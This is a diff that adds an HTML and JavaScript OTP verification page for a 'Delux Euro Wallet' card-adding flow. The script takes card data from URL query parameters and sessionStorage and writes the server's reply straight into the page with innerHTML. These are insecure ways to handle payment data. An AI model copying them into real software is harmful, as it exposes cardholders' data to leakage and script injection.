@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - Delux Euro Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            outline: none;
+        }
+        .otp-input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 5px rgba(102, 126, 234, 0.5);
+        }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #5a67d8;
+        }
+        .resend-link {
+            margin-top: 20px;
+            color: #667eea;
+            cursor: pointer;
+            display: block;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            display: block;
+            margin-top: 20px;
+            color: #666;
+            text-decoration: none;
+        }
+        .back-link:hover {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 OTP Verification</h1>
+        <p>Enter the 6-digit OTP sent to your registered email/phone</p>
+        
+        <form id="otpForm">
+            <div class="otp-inputs">
+                <input type="text" class="otp-input" maxlength="1" data-index="0" required>
+                <input type="text" class="otp-input" maxlength="1" data-index="1" required>
+                <input type="text" class="otp-input" maxlength="1" data-index="2" required>
+                <input type="text" class="otp-input" maxlength="1" data-index="3" required>
+                <input type="text" class="otp-input" maxlength="1" data-index="4" required>
+                <input type="text" class="otp-input" maxlength="1" data-index="5" required>
+            </div>
+            
+            <input type="hidden" id="otpValue" name="otp">
+            <input type="hidden" id="cardData" name="cardData">
+            
+            <button type="submit">Verify OTP</button>
+        </form>
+        
+        <a href="/cards.html" class="back-link">← Back to Cards</a>
+    </div>
+
+    <script>
+        // Get card data from URL or session
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardData = urlParams.get('cardData') || sessionStorage.getItem('pendingCardData');
+        
+        if (cardData) {
+            document.getElementById('cardData').value = cardData;
+            sessionStorage.setItem('pendingCardData', cardData);
+        }
+
+        // Handle OTP input navigation
+        const otpInputs = document.querySelectorAll('.otp-input');
+        
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                updateOTPValue();
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+            
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text').trim();
+                if (/^\d{6}$/.test(pasteData)) {
+                    pasteData.split('').forEach((digit, idx) => {
+                        if (otpInputs[idx]) {
+                            otpInputs[idx].value = digit;
+                        }
+                    });
+                    updateOTPValue();
+                }
+            });
+        });
+
+        function updateOTPValue() {
+            let otp = '';
+            otpInputs.forEach(input => {
+                otp += input.value;
+            });
+            document.getElementById('otpValue').value = otp;
+        }
+
+        // Handle form submission
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const otp = document.getElementById('otpValue').value;
+            const cardData = document.getElementById('cardData').value;
+            
+            if (otp.length !== 6) {
+                alert('Please enter a valid 6-digit OTP');
+                return;
+            }
+            
+            if (!cardData) {
+                alert('Card data not found. Please add card again.');
+                window.location.href = '/cards.html';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/verify-card-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        otp: otp,
+                        cardData: cardData
+                    })
+                });
+                
+                const result = await response.text();
+                document.body.innerHTML = result;
+                
+                // Clear session storage
+                sessionStorage.removeItem('pendingCardData');
+            } catch (error) {
+                console.error('OTP verification error:', error);
+                alert('OTP verification failed. Please try again.');
+            }
+        });
+
+        // Auto-focus first OTP input
+        document.addEventListener('DOMContentLoaded', () => {
+            otpInputs[0].focus();
+        });
+    </script>
+</body>
+</html>
